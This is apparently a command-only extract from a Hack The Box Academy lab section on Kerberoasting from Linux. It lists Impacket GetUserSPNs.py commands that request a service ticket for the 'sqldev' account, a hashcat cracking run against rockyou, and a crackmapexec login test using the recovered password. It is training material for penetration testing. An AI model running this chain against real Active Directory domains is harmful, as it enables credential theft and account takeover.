# Section 17: Kerberoasting - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1274
- Code/command blocks: 8

> Terminal output is omitted; only commands & scripts are captured.

## 1. `shellsession` _(output omitted)_

```bash
sudo python3 -m pip install .
```

## 2. `shellsession` _(output omitted)_

```bash
GetUserSPNs.py -h
```

## 3. `shellsession` _(output omitted)_

```bash
GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}
```

## 4. `shellsession` _(output omitted)_

```bash
GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request 
```

## 5. `shellsession` _(output omitted)_

```bash
GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev
```

## 6. `shellsession` _(output omitted)_

```bash
GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev -outputfile sqldev_tgs
```

## 7. `shellsession` _(output omitted)_

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

## 8. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb {{DC_IP}} -u sqldev -p database!
```

